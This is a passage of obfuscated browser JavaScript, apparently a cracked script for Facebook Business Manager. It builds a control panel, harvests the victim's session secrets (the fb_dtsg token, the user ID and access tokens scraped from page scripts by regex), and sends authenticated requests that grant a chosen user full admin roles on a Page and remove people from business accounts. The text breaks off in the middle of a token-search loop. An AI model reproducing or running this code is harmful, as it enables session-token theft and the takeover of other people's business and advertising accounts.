                                                        MFck.appendChild(UvAGb);
                                                        varQsuGb = document.createElement("button");
                                                        QsuGb.textContent = "💰ShowAddPeopleToPageFacebookAsAdminFacebookSections💰";
                                                        QsuGb.style.display = "none";
                                                        QsuGb.style.width = "70%";
                                                        QsuGb.style.height = "30px";
                                                        QsuGb.style.marginBottom = "10px";
                                                        QsuGb.style.backgroundColor = "Blue";
                                                        QsuGb.style.color = "white";
                                                        varsuxGb = NaN === NaN;
                                                        QsuGb.addEventListener("click", function() {
                                                            sOkHb.style.display = suxGb ? "none" : "block";
                                                            gFSGb.style.display = suxGb ? "none" : "block";
                                                            IGVGb.style.display = suxGb ? "none" : "block";
                                                            oLeHb.style.display = suxGb ? "none" : "block";
                                                            QMhHb.style.display = suxGb ? "none" : "block";
                                                            kIYGb.style.display = suxGb ? "none" : "block";
                                                            MJbHb.style.display = suxGb ? "none" : "block";
                                                            suxGb = !suxGb;
                                                            QsuGb.textContent = suxGb ? "💰HideAddPeopleToPageFacebookAsAdminFacebookSections💰" : "💰ShowAddPeopleToPageFacebookAsAdminFacebookSections💰";
                                                            QsuGb.style.backgroundColor = suxGb ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(QsuGb);
                                                        varsOkHb = document.createElement("button");
                                                        sOkHb.textContent = "AddPeopleonPageFacebookAsAdminonbusinessuser🆕";
                                                        sOkHb.style.margin = "0auto";
                                                        sOkHb.style.padding = "10px20px";
                                                        sOkHb.style.background = "blue";
                                                        sOkHb.style.color = "white";
                                                        sOkHb.style.border = "none";
                                                        sOkHb.style.borderRadius = "5px";
                                                        sOkHb.style.display = "none";
                                                        MFck.appendChild(sOkHb);
                                                        varUPnHb = document.createElement("button");
                                                        UPnHb.textContent = "PleaseWait👩‍💻";
                                                        UPnHb.style.display = "none";
                                                        UPnHb.style.margin = "0auto";
                                                        UPnHb.style.padding = "10px20px";
                                                        UPnHb.style.background = "red";
                                                        UPnHb.style.color = "white";
                                                        UPnHb.style.border = "none";
                                                        UPnHb.style.borderRadius = "5px";
                                                        MFck.appendChild(UPnHb);
                                                        varoLeHb = document.createElement("label");
                                                        oLeHb.innerText = "PageID:";
                                                        oLeHb.style.display = "none";
                                                        MFck.appendChild(oLeHb);
                                                        varQMhHb = document.createElement("input");
                                                        QMhHb.placeholder = "EnterPageID";
                                                        QMhHb.style.width = "100%";
                                                        QMhHb.style.display = "none";
                                                        QMhHb.style.height = "30px";
                                                        QMhHb.style.marginBottom = "10px";
                                                        MFck.appendChild(QMhHb);
                                                        varkIYGb = document.createElement("label");
                                                        kIYGb.innerText = "InstagramUserID:";
                                                        kIYGb.style.display = "none";
                                                        MFck.appendChild(kIYGb);
                                                        varMJbHb = document.createElement("input");
                                                        MJbHb.placeholder = "EnterInstagramUserID";
                                                        MJbHb.style.display = "none";
                                                        MJbHb.style.width = "100%";
                                                        MJbHb.style.height = "30px";
                                                        MJbHb.style.marginBottom = "10px";
                                                        MFck.appendChild(MJbHb);
                                                        vargFSGb = document.createElement("label");
                                                        gFSGb.innerText = "BusinessID:";
                                                        gFSGb.style.display = "none";
                                                        MFck.appendChild(gFSGb);
                                                        varIGVGb = document.createElement("input");
                                                        IGVGb.placeholder = "EnterbusinessID";
                                                        IGVGb.style.width = "100%";
                                                        IGVGb.style.marginBottom = "10px";
                                                        IGVGb.style.display = "none";
                                                        MFck.appendChild(IGVGb);
                                                        varIaJHb = require("BusinessUnifiedNavigationContext").businessID;
                                                        IGVGb.value = IaJHb;
                                                        sOkHb.addEventListener("click", function() {
                                                            sOkHb.style.display = "none";
                                                            UPnHb.style.display = "block";
                                                            fetch("https://business.facebook.com/business/business_objects/update/permissions/", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "asset_ids[0]=".concat(QMhHb.value, "&asset_type=page&business_id=").concat(IGVGb.value, "&roles[0]=461340961883703&roles[1]=2565488997052663&roles[2]=556750461849806&roles[3]=275298030109664&roles[4]=696659004201852&roles[5]=270956550540539&roles[6]=794616964377599&roles[7]=290727579301631&user_ids[0]=").concat(MJbHb.value, "&__user=").concat(_oXDFb.value, "&__a=1&__req=1r&__hs=19592.BP%3Abrands_pkg.2.0..0.0&dpr=1&__ccg=EXCELLENT&__rev=1008209021&__s=k4rap9%3Apojkue%3Azkvt8z&__hsi=7270418874708994082&__dyn=7xeUmxa2C5rgydwCwRyU8EKnFG5UkBwCwgE98nCwRCwqojyUV0RAAzpoixW4E5S2WdwJwCwq8gwqoqyoyazoO4o461twOxa7FEd89EmwoU9FE4WqbwQzocGwhRDwRyUvwxwu8sxe5bwEwk89oeUa8fGxnzoO1WwamcwgECu7E422a3Fe6rwnVUao9k2B12ewi8doa84K5E6a6S6UgyHwyx6i8wxK2efK7UW1dx-q4VEhwwwj84-3ifzobEaUiwm8Wubwk8Sp1G3WcwMzUkGum2ym2WEdEO8wl8hyVEKu9zUbVEHyU8U3yDwqU4C1Lx3wlFbwCwiUWqU9E5C1dxW10wEwn9U&__csr=&fb_dtsg=").concat(_YeTFb.value, "&__bid=2237325153322972&__spin_r=1008209021&__spin_b=trunk&__spin_t=1692776306&__jssesw=1")), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(kcMHb) {
                                                                kcMHb.text().then(function(EXCHb) {
                                                                    console.log(EXCHb);
                                                                    sCXh.value = EXCHb;
                                                                    sOkHb.style.display = "block";
                                                                    UPnHb.style.display = "none";
                                                                });
                                                            }).catch(function(gZFHb) {
                                                                console.error(gZFHb);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                            console.log("⌛...TryAddPeopleonPageAsAdminInProgress...⌛");
                                                            sCXh.value = "⌛...TryAddPeopleonPageAsAdminInProgress...⌛";
                                                        });
                                                        document.body.appendChild(sOkHb);
                                                        sOkHb.style.width = "100%";
                                                        sOkHb.style.height = "30px";
                                                        sOkHb.style.marginBottom = "10px";
                                                        sOkHb.style.backgroundColor = "RED";
                                                        sOkHb.style.color = "white";
                                                        MFck.appendChild(sOkHb);
                                                        varAUwHb = document.createElement("button");
                                                        AUwHb.textContent = "💰ShowBusinessTools💰";
                                                        AUwHb.style.width = "100%";
                                                        AUwHb.style.height = "50px";
                                                        AUwHb.style.marginBottom = "10px";
                                                        AUwHb.style.backgroundColor = "Turquoise";
                                                        AUwHb.style.color = "white";
                                                        varcWzHb = NaN === NaN;
                                                        AUwHb.addEventListener("click", function() {
                                                            wRqHb.style.display = cWzHb ? "none" : "block";
                                                            cWzHb = !cWzHb;
                                                            AUwHb.textContent = cWzHb ? "💰HideBusinessTools💰" : "💰ShowBusinessTools💰";
                                                            AUwHb.style.backgroundColor = cWzHb ? "Gray" : "Turquoise";
                                                            sCXh.style.display = cWzHb ? "none" : "block";
                                                        });
                                                        MFck.appendChild(AUwHb);
                                                        varwRqHb = document.createElement("button");
                                                        wRqHb.textContent = "💰ShowRemovePeopleFromBusinessFBANDINSTASections💰";
                                                        wRqHb.style.display = "none";
                                                        wRqHb.style.width = "70%";
                                                        wRqHb.style.height = "30px";
                                                        wRqHb.style.marginBottom = "10px";
                                                        wRqHb.style.backgroundColor = "Blue";
                                                        wRqHb.style.color = "white";
                                                        varYStHb = NaN === NaN;
                                                        wRqHb.addEventListener("click", function() {
                                                            AsvEb.style.display = YStHb ? "none" : "block";
                                                            cuyEb.style.display = YStHb ? "none" : "block";
                                                            YqsEb.style.display = YStHb ? "none" : "block";
                                                            smjEb.style.display = YStHb ? "none" : "block";
                                                            ojdEb.style.display = YStHb ? "none" : "block";
                                                            ojdEb.style.display = YStHb ? "none" : "block";
                                                            EvBEb.style.display = YStHb ? "none" : "block";
                                                            gxEEb.style.display = YStHb ? "none" : "block";
                                                            ISuFb.style.display = YStHb ? "none" : "block";
                                                            YStHb = !YStHb;
                                                            wRqHb.textContent = YStHb ? "💰HideRemovePeopleFromBusinessFBANDINSTASections💰" : "💰ShowRemovePeopleFromBusinessFBANDINSTASections💰";
                                                            wRqHb.style.backgroundColor = YStHb ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(wRqHb);
                                                        varAsvEb = document.createElement("label");
                                                        AsvEb.innerText = "BusinessUserID[You]:";
                                                        AsvEb.style.display = "none";
                                                        MFck.appendChild(AsvEb);
                                                        varcuyEb = document.createElement("input");
                                                        cuyEb.placeholder = "EnterbusinessUserID";
                                                        cuyEb.style.width = "100%";
                                                        cuyEb.style.marginBottom = "10px";
                                                        cuyEb.style.display = "none";
                                                        MFck.appendChild(cuyEb);
                                                        varwppEb = require("CurrentBusinessUser").business_user_id;
                                                        cuyEb.value = wppEb;
                                                        varYqsEb = document.createElement("label");
                                                        YqsEb.innerText = "BusinessID:";
                                                        YqsEb.style.display = "none";
                                                        MFck.appendChild(YqsEb);
                                                        varsmjEb = document.createElement("input");
                                                        smjEb.placeholder = "EnterbusinessID";
                                                        smjEb.style.width = "100%";
                                                        smjEb.style.marginBottom = "10px";
                                                        smjEb.style.display = "none";
                                                        MFck.appendChild(smjEb);
                                                        varUnmEb = require("BusinessUnifiedNavigationContext").businessID;
                                                        smjEb.value = UnmEb;
                                                        varojdEb = document.createElement("button");
                                                        ojdEb.textContent = "RemovePeople(BusinessUserID)FromBusinessINSTAGRAM🆕";
                                                        ojdEb.style.margin = "0auto";
                                                        ojdEb.style.padding = "10px20px";
                                                        ojdEb.style.background = "blue";
                                                        ojdEb.style.color = "white";
                                                        ojdEb.style.border = "none";
                                                        ojdEb.style.borderRadius = "5px";
                                                        ojdEb.style.display = "none";
                                                        MFck.appendChild(ojdEb);
                                                        varQkgEb = document.createElement("button");
                                                        QkgEb.textContent = "PleaseWait👩‍💻";
                                                        QkgEb.style.display = "none";
                                                        QkgEb.style.margin = "0auto";
                                                        QkgEb.style.padding = "10px20px";
                                                        QkgEb.style.background = "red";
                                                        QkgEb.style.color = "white";
                                                        QkgEb.style.border = "none";
                                                        QkgEb.style.borderRadius = "5px";
                                                        MFck.appendChild(QkgEb);
                                                        ojdEb.addEventListener("click", function() {
                                                            ojdEb.style.display = "none";
                                                            QkgEb.style.display = "block";
                                                            fetch("https://business.facebook.com/api/graphql/", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "av=".concat(_oXDFb.value, "&__usid=6-Ts896g4w2d75h%3APs89fwa1xbjr6b%3A0-As896081aloh55-RV%3D6%3AF%3D&__user=").concat(_oXDFb.value, "&__a=1&__req=p&__hs=19756.BP%3Abizweb_pkg.2.0..0.0&dpr=1&__ccg=EXCELLENT&__rev=1011202790&__s=0kihzj%3Asw0w2e%3Amqz8gd&__hsi=7331210083121485152&__dyn=7xeUmxa2C5rgydwn8K2abBAqxu59o9E4a2i5VEdpE6C4UKewSAAzpoixW4E5S2WdwJwCwuo6C6EC4UScx60DUcEixWq3i2q5E6e2qq1eCyUd8S2-mEsg9BwZyU461UxO2yUa8522m3K2y11xmfz87G0FoO12ypUuwg88EeAUpK1vDwFwBgaohzE4y3m2y1bxq1yxJxK48GU8EhAwGK2efK2W1dx-q4VEhwwwGwxwjU88jzUS2W2K4E5yeDyU52dwyx22ScwMzUkGu3i2WE4e8yE4C4oKqbDyo-2-qaUK2e0UFU2RwrUgU98cpbwCwiUWqU9Eco9U4S7ErwAwEwn9U2vw&__csr=&fb_dtsg=NAcOXi9r7izIJoCShrKJLjjbP-wF67e0EoBKjzuV2HvIYR3jVNUROPw%3A19%3A1706917545&jazoest=25449&lsd=VhFxNOtRanLDe3ZqgJKWft&__aaid=0&__bid=1771238816690718&__spin_r=1011202790&__spin_b=trunk&__spin_t=1706930362&__jssesw=1&qpl_active_flow_ids=558508505&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=BizKitSettingsRemoveBusinessUserMutation&variables=%7B%22businessID%22%3A%22").concat(smjEb.value, "%22%2C%22businessUserID%22%3A%22").concat(cuyEb.value, "%22%7D&server_timestamps=true&doc_id=24401670346098526&fb_api_analytics_tags=%5B%22qpl_active_flow_ids%3D558508505%22%5D")), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(QETEb) {
                                                                QETEb.text().then(function(sGWEb) {
                                                                    console.log(sGWEb);
                                                                    sCXh.value = sGWEb;
                                                                    ojdEb.style.display = "block";
                                                                    QkgEb.style.display = "none";
                                                                });
                                                            }).catch(function(MBNEb) {
                                                                console.error(MBNEb);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                            console.log("⌛...TryRemovePeopleFromBusinessInProgress...⌛");
                                                            sCXh.value = "⌛...TryRemovePeopleFromBusinessInProgress...⌛";
                                                        });
                                                        document.body.appendChild(ojdEb);
                                                        ojdEb.style.width = "100%";
                                                        ojdEb.style.height = "30px";
                                                        ojdEb.style.marginBottom = "10px";
                                                        ojdEb.style.backgroundColor = "RED";
                                                        ojdEb.style.color = "white";
                                                        MFck.appendChild(ojdEb);
                                                        varoDQEb = document.body.innerHTML;
                                                        varIyHEb = oDQEb.match(/"accessToken":"(EAA[^"]+)"/);
                                                        varkAKEb = IyHEb ? IyHEb[1] : "";
                                                        varaccess_token2 = kAKEb;
                                                        varEvBEb = document.createElement("label");
                                                        EvBEb.innerText = "AccessToken:";
                                                        EvBEb.style.display = "none";
                                                        MFck.appendChild(EvBEb);
                                                        vargxEEb = document.createElement("textarea");
                                                        gxEEb.placeholder = "EnterAccessToken:";
                                                        gxEEb.style.width = "100%";
                                                        gxEEb.style.height = "70px";
                                                        gxEEb.style.marginBottom = "10px";
                                                        gxEEb.style.display = "none";
                                                        MFck.appendChild(gxEEb);
                                                        vargRrFb = MJTQb;
                                                        gxEEb.value = gRrFb;
                                                        varISuFb = document.createElement("button");
                                                        ISuFb.textContent = "RemovePeople(BusinessUserID)FromBusinessFacebook🆕";
                                                        ISuFb.style.margin = "0auto";
                                                        ISuFb.style.padding = "10px20px";
                                                        ISuFb.style.background = "blue";
                                                        ISuFb.style.color = "white";
                                                        ISuFb.style.border = "none";
                                                        ISuFb.style.borderRadius = "5px";
                                                        ISuFb.style.display = "none";
                                                        MFck.appendChild(ISuFb);
                                                        varcOlFb = document.createElement("button");
                                                        cOlFb.textContent = "PleaseWait👩‍💻";
                                                        cOlFb.style.display = "none";
                                                        cOlFb.style.margin = "0auto";
                                                        cOlFb.style.padding = "10px20px";
                                                        cOlFb.style.background = "red";
                                                        cOlFb.style.color = "white";
                                                        cOlFb.style.border = "none";
                                                        cOlFb.style.borderRadius = "5px";
                                                        MFck.appendChild(cOlFb);
                                                        ISuFb.addEventListener("click", function() {
                                                            ISuFb.style.display = "none";
                                                            cOlFb.style.display = "block";
                                                            fetch("https://graph.facebook.com/v17.0/".concat(cuyEb.value, "?access_token=").concat(gxEEb.value), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__activeScenarioIDs=%5B%5D&__activeScenarios=%5B%5D&__interactionsMetadata=%5B%5D&_reqName=object%3Abusiness_user&_reqSrc=UserServerActions.brands&locale=en_US&method=delete&pretty=0&suppress_http_code=1&xref=f27e6b218809828"), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(EPoFb) {
                                                                EPoFb.text().then(function(YKfFb) {
                                                                    console.log(YKfFb);
                                                                    sCXh.value = YKfFb;
                                                                    ISuFb.style.display = "block";
                                                                    cOlFb.style.display = "none";
                                                                });
                                                            }).catch(function(AMiFb) {
                                                                console.error(AMiFb);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                            console.log("⌛...TryRemovePeopleFromBusinessFacebookInProgress...⌛");
                                                            sCXh.value = "⌛...TryRemovePeopleFromBusinessFacebookInProgress...⌛";
                                                        });
                                                        document.body.appendChild(ISuFb);
                                                        ISuFb.style.width = "100%";
                                                        ISuFb.style.height = "30px";
                                                        ISuFb.style.marginBottom = "10px";
                                                        ISuFb.style.backgroundColor = "RED";
                                                        ISuFb.style.color = "white";
                                                        MFck.appendChild(ISuFb);
                                                        varUHZEb = document.createElement("button");
                                                        UHZEb.textContent = "💰ShowRequireInfoSections💰";
                                                        UHZEb.style.width = "100%";
                                                        UHZEb.style.height = "30px";
                                                        UHZEb.style.marginBottom = "10px";
                                                        UHZEb.style.backgroundColor = "Blue";
                                                        UHZEb.style.color = "white";
                                                        varwJcFb = NaN === NaN;
                                                        UHZEb.addEventListener("click", function() {
                                                            wdQFb.style.display = wJcFb ? "none" : "block";
                                                            _YeTFb.style.display = wJcFb ? "none" : "block";
                                                            UbNFb.style.display = wJcFb ? "none" : "block";
                                                            _oXDFb.style.display = wJcFb ? "none" : "block";
                                                            wJcFb = !wJcFb;
                                                            UHZEb.textContent = wJcFb ? "💰HideRequireInfoSections💰" : "💰ShowRequireInfoSections💰";
                                                            UHZEb.style.backgroundColor = wJcFb ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(UHZEb);
                                                        varwdQFb = document.createElement("label");
                                                        wdQFb.innerText = "fb_dtsgAccountHash:";
                                                        wdQFb.style.display = "none";
                                                        MFck.appendChild(wdQFb);
                                                        var_YeTFb = document.createElement("input");
                                                        _YeTFb.type = "text";
                                                        _YeTFb.placeholder = "Enterfb_dtsgAccountHash";
                                                        _YeTFb.style.width = "100%";
                                                        _YeTFb.style.height = "50px";
                                                        _YeTFb.style.marginBottom = "10px";
                                                        _YeTFb.style.display = "none";
                                                        MFck.appendChild(_YeTFb);
                                                        varsaKFb = require("DTSGInitialData").token || document.querySelector('[name="fb_dtsg"]').value;
                                                        _YeTFb.value = saKFb;
                                                        varUbNFb = document.createElement("label");
                                                        UbNFb.innerText = "UserID:";
                                                        UbNFb.style.display = "none";
                                                        MFck.appendChild(UbNFb);
                                                        var_oXDFb = document.createElement("input");
                                                        _oXDFb.type = "text";
                                                        _oXDFb.placeholder = "EnterUserID";
                                                        _oXDFb.style.width = "100%";
                                                        _oXDFb.style.height = "50px";
                                                        _oXDFb.style.marginBottom = "10px";
                                                        _oXDFb.style.display = "none";
                                                        MFck.appendChild(_oXDFb);
                                                        varQYGFb = require("CurrentUserInitialData").USER_ID || [removed].match(/c_user=([0-9]+)/)[1];
                                                        _oXDFb.value = QYGFb;
                                                        varkUxFb = document.createElement("label");
                                                        kUxFb.innerText = "PageID:";
                                                        kUxFb.style.display = "none";
                                                        MFck.appendChild(kUxFb);
                                                        var_MVAFb = document.createElement("input");
                                                        _MVAFb.type = "text";
                                                        _MVAFb.placeholder = "EnterPageID";
                                                        _MVAFb.style.width = "100%";
                                                        _MVAFb.style.height = "50px";
                                                        _MVAFb.style.marginBottom = "10px";
                                                        _MVAFb.style.display = "none";
                                                        MFck.appendChild(_MVAFb);
                                                        varovCCb = require("CurrentUserInitialData").USER_ID;
                                                        _MVAFb.value = ovCCb;
                                                        varQwFCb = document.createElement("button");
                                                        QwFCb.textContent = "🔎CheckAdsCampaignDelivery🔎";
                                                        QwFCb.style.width = "100%";
                                                        QwFCb.style.height = "30px";
                                                        QwFCb.style.marginBottom = "10px";
                                                        QwFCb.style.backgroundColor = "green";
                                                        QwFCb.style.color = "white";
                                                        QwFCb.addEventListener("click", function() {
                                                            varkswCb = document.createElement("div");
                                                            kswCb.style.position = "fixed";
                                                            kswCb.style.top = "50%";
                                                            kswCb.style.left = "50%";
                                                            kswCb.style.transform = "translate(-50%,-50%)";
                                                            kswCb.style.width = "500px";
                                                            kswCb.style.padding = "50px";
                                                            kswCb.style.background = "white";
                                                            kswCb.style.color = "black";
                                                            kswCb.style.borderRadius = "10px";
                                                            kswCb.style.boxShadow = "0010pxrgba(0,0,0,0.5)";
                                                            kswCb.style.zIndex = "9999";
                                                            document.body.appendChild(kswCb);
                                                            varMtzCb = document.createElement("div");
                                                            MtzCb.textContent = "❤️سبحاناللهوبحمدهسبحاناللهالعظيم❤️/❤️صلواعليرسولاللهصلياللهعليهوسلم❤️";
                                                            MtzCb.style.textAlign = "center";
                                                            MtzCb.style.marginBottom = "10px";
                                                            kswCb.appendChild(MtzCb);
                                                            vargpqCb = document.createElement("div");
                                                            gpqCb.textContent = "❤️ScriptAdsStatus!for:Wonka=Jerusalem❤️❤️";
                                                            gpqCb.style.textAlign = "center";
                                                            gpqCb.style.marginBottom = "25px";
                                                            kswCb.appendChild(gpqCb);
                                                            varIqtCb = document.createElement("button");
                                                            IqtCb.textContent = "GetAdsInformation(فحصمعلوماتالإعلان)🔍";
                                                            IqtCb.style.display = "block";
                                                            IqtCb.style.margin = "0auto";
                                                            IqtCb.style.padding = "15px20px";
                                                            IqtCb.style.background = "Green";
                                                            IqtCb.style.color = "white";
                                                            IqtCb.style.border = "none";
                                                            IqtCb.style.borderRadius = "5px";
                                                            kswCb.appendChild(IqtCb);
                                                            varcmkCb = document.createElement("button");
                                                            cmkCb.textContent = "PleaseWait👩‍💻";
                                                            cmkCb.style.display = "none";
                                                            cmkCb.style.margin = "0auto";
                                                            cmkCb.style.padding = "10px20px";
                                                            cmkCb.style.background = "red";
                                                            cmkCb.style.color = "white";
                                                            cmkCb.style.border = "none";
                                                            cmkCb.style.borderRadius = "5px";
                                                            kswCb.appendChild(cmkCb);
                                                            varEnnCb = document.createElement("div");
                                                            EnnCb.textContent = "";
                                                            EnnCb.style.textAlign = "center";
                                                            EnnCb.style.marginBottom = "25px";
                                                            kswCb.appendChild(EnnCb);
                                                            varEHaDb = document.createElement("div");
                                                            EHaDb.textContent = "❤️AdsInformation-معلوماتالإعلان❤️";
                                                            EHaDb.style.textAlign = "center";
                                                            EHaDb.style.marginBottom = "25px";
                                                            kswCb.appendChild(EHaDb);
                                                            vargJdDb = document.createElement("label");
                                                            gJdDb.innerText = "TargetAdaccountID:(معرفالحسابالإعلاني)";
                                                            kswCb.appendChild(gJdDb);
                                                            varAEUCb = document.createElement("input");
                                                            AEUCb.placeholder = "EnterAdaccountID";
                                                            AEUCb.style.width = "100%";
                                                            AEUCb.style.marginBottom = "10px";
                                                            kswCb.appendChild(AEUCb);
                                                            varcGXCb = require("CurrentAdAccountInitialData").AD_ACCOUNT_ID;
                                                            AEUCb.value = cGXCb;
                                                            varwBOCb = document.createElement("div");
                                                            wBOCb.style.display = "flex";
                                                            wBOCb.style.alignItems = "center";
                                                            varYCRCb = document.createElement("label");
                                                            YCRCb.innerText = "AdsStatus(حالةالاعلان)🔍:";
                                                            YCRCb.style.marginRight = "10px";
                                                            varsyICb = document.createElement("input");
                                                            syICb.placeholder = "WaitingAdsStatus...";
                                                            syICb.style.width = "50%";
                                                            wBOCb.appendChild(YCRCb);
                                                            wBOCb.appendChild(syICb);
                                                            kswCb.appendChild(wBOCb);
                                                            varUzLCb = document.createElement("div");
                                                            UzLCb.style.display = "flex";
                                                            UzLCb.style.alignItems = "center";
                                                            varUTyDb = document.createElement("label");
                                                            UTyDb.innerText = "CampaignName(اسمالحملة)🔍:";
                                                            UTyDb.style.marginRight = "10px";
                                                            varwVBDb = document.createElement("input");
                                                            wVBDb.placeholder = "WaitingCampaignName..";
                                                            wVBDb.style.width = "50%";
                                                            UzLCb.appendChild(UTyDb);
                                                            UzLCb.appendChild(wVBDb);
                                                            kswCb.appendChild(UzLCb);
                                                            varQQsDb = document.createElement("label");
                                                            QQsDb.innerText = "InstagramUserID:";
                                                            kswCb.appendChild(QQsDb);
                                                            QQsDb.style.display = "none";
                                                            varsSvDb = document.createElement("input");
                                                            sSvDb.placeholder = "EnterInstagramID";
                                                            sSvDb.style.width = "100%";
                                                            sSvDb.style.marginBottom = "10px";
                                                            kswCb.appendChild(sSvDb);
                                                            sSvDb.style.display = "none";
                                                            varMNmDb = require("CurrentUserInitialData").USER_ID;
                                                            sSvDb.value = MNmDb;
                                                            varoPpDb = document.createElement("div");
                                                            oPpDb.style.display = "flex";
                                                            oPpDb.style.alignItems = "center";
                                                            varIKgDb = document.createElement("label");
                                                            IKgDb.innerText = "ThresholdAmount:(المديونية)";
                                                            IKgDb.style.marginRight = "10px";
                                                            varkMjDb = document.createElement("input");
                                                            kMjDb.placeholder = "WaitingThresholdAmount...";
                                                            kMjDb.style.width = "50%";
                                                            oPpDb.appendChild(IKgDb);
                                                            oPpDb.appendChild(kMjDb);
                                                            kswCb.appendChild(oPpDb);
                                                            varkgXDb = document.createElement("div");
                                                            kgXDb.style.display = "flex";
                                                            kgXDb.style.alignItems = "center";
                                                            varMhaEb = document.createElement("label");
                                                            MhaEb.innerText = "DailySpendLimit:(السحباليومي)";
                                                            MhaEb.style.marginRight = "10px";
                                                            vargdRDb = document.createElement("input");
                                                            gdRDb.placeholder = "WaitingDailySpendLimit...";
                                                            gdRDb.style.width = "50%";
                                                            kgXDb.appendChild(MhaEb);
                                                            kgXDb.appendChild(gdRDb);
                                                            kswCb.appendChild(kgXDb);
                                                            varIeUDb = document.createElement("div");
                                                            IeUDb.style.display = "flex";
                                                            IeUDb.style.alignItems = "center";
                                                            varcaLDb = document.createElement("label");
                                                            caLDb.innerText = "Balance:(الرصيدالحالي)";
                                                            caLDb.style.marginRight = "10px";
                                                            varEbODb = document.createElement("input");
                                                            EbODb.placeholder = "WaitingBalance...";
                                                            EbODb.style.width = "50%";
                                                            IeUDb.appendChild(caLDb);
                                                            IeUDb.appendChild(EbODb);
                                                            kswCb.appendChild(IeUDb);
                                                            varYWEDb = document.createElement("div");
                                                            YWEDb.style.display = "flex";
                                                            YWEDb.style.alignItems = "center";
                                                            varAYHDb = document.createElement("label");
                                                            AYHDb.innerText = "AmountSpend:(المصروف)";
                                                            AYHDb.style.marginRight = "10px";
                                                            varcyJAb = document.createElement("input");
                                                            cyJAb.placeholder = "WaitingAmountSpend...";
                                                            cyJAb.style.width = "50%";
                                                            YWEDb.appendChild(AYHDb);
                                                            YWEDb.appendChild(cyJAb);
                                                            kswCb.appendChild(YWEDb);
                                                            varEzMAb = document.createElement("label");
                                                            EzMAb.innerText = "AdAccountStatus:(حالةالحسابالإعلاني)";
                                                            kswCb.appendChild(EzMAb);
                                                            varYuDAb = document.createElement("input");
                                                            YuDAb.placeholder = "WaitingAdAccountStatus...";
                                                            YuDAb.style.width = "100%";
                                                            YuDAb.style.marginBottom = "10px";
                                                            kswCb.appendChild(YuDAb);
                                                            varAwGAb = document.createElement("textarea");
                                                            AwGAb.placeholder = "WaitingDetailsfromServer...!";
                                                            AwGAb.style.width = "100%";
                                                            AwGAb.style.height = "100px";
                                                            AwGAb.style.marginBottom = "10px";
                                                            kswCb.appendChild(AwGAb);
                                                            varUrxAb = document.createElement("label");
                                                            UrxAb.innerText = "ImageName🔍:";
                                                            kswCb.appendChild(UrxAb);
                                                            UrxAb.style.display = "block";
                                                            varwtAAb = document.createElement("input");
                                                            wtAAb.placeholder = "WaitingImageName..";
                                                            wtAAb.style.width = "100%";
                                                            wtAAb.style.marginBottom = "10px";
                                                            kswCb.appendChild(wtAAb);
                                                            wtAAb.style.display = "block";
                                                            varQorAb = document.createElement("label");
                                                            QorAb.innerText = "ImageLinkURL🔍:";
                                                            kswCb.appendChild(QorAb);
                                                            QorAb.style.display = "block";
                                                            varsquAb = document.createElement("input");
                                                            squAb.placeholder = "WaitingImageLinkURL..";
                                                            squAb.style.width = "100%";
                                                            squAb.style.marginBottom = "10px";
                                                            kswCb.appendChild(squAb);
                                                            squAb.style.display = "block";
                                                            varsKhBb = document.createElement("textarea");
                                                            sKhBb.placeholder = "WaitingDetailsfromServer2...!";
                                                            sKhBb.style.width = "100%";
                                                            sKhBb.style.height = "50px";
                                                            sKhBb.style.marginBottom = "10px";
                                                            kswCb.appendChild(sKhBb);
                                                            varULkBb = document.createElement("button");
                                                            ULkBb.textContent = "X";
                                                            ULkBb.style.position = "absolute";
                                                            ULkBb.style.top = "10px";
                                                            ULkBb.style.right = "10px";
                                                            ULkBb.style.width = "30px";
                                                            ULkBb.style.height = "30px";
                                                            ULkBb.style.border = "none";
                                                            ULkBb.style.borderRadius = "50%";
                                                            ULkBb.style.background = "red";
                                                            ULkBb.style.color = "black";
                                                            ULkBb.style.fontSize = "16px";
                                                            kswCb.appendChild(ULkBb);
                                                            varoHbBb = document.createElement("div");
                                                            oHbBb.textContent = "❤️CrackedByWonka=Jerusalem❤️";
                                                            oHbBb.style.textAlign = "center";
                                                            oHbBb.style.marginBottom = "25px";
                                                            kswCb.appendChild(oHbBb);
                                                            ULkBb.addEventListener("click", function() {
                                                                kswCb.style.display = "none";
                                                            });
                                                            IqtCb.addEventListener("click", function() {
                                                                AwGAb.value = "";
                                                                sKhBb.value = "";
                                                                kMjDb.value = "";
                                                                gdRDb.value = "";
                                                                syICb.value = "";
                                                                wVBDb.value = "";
                                                                EbODb.value = "";
                                                                cyJAb.value = "";
                                                                YuDAb.value = "";
                                                                wtAAb.value = "";
                                                                squAb.value = "";
                                                                console.log("Lookingfortoken");
                                                                varQIeBb = document.getElementsByTagName("script");
                                                                varkEVAb = 0;
                                                                varMFYAb = "";
                                                                vargBPAb = IWFBb("act");
                                                                varICSAb = /selected_account_id:"(.*?)"/gi;
                                                                functionIWFBb(a) {
                                                                    varETzBb = newURLSearchParams(window.location.search);
                                                                    returnETzBb.get(a);
                                                                }
                                                                varb = 1;
                                                                wVxw: while (b < 65535) {
                                                                    switch (b) {
                                                                        case1: b = kEVAb < QIeBb.length ? 2 : 65535;
                                                                        break;
                                                                        case2: b = 3; {
                                                                            varAQtBb = QIeBb[kEVAb].innerHTML;
                                                                            varcSwBb = /"EA[A-Za-z0-9]{20,}"/gm;
                                                                            varwNnBb = AQtBb.match(cSwBb);
                                                                            varc = 0;
                                                                            while (c < 65535) {
                                                                                switch (c) {
                                                                                    case0: c = wNnBb && wNnBb.length > 0 ? 1 : 65535;
                                                                                    break;
                                                                                    case1: c = 65535; {
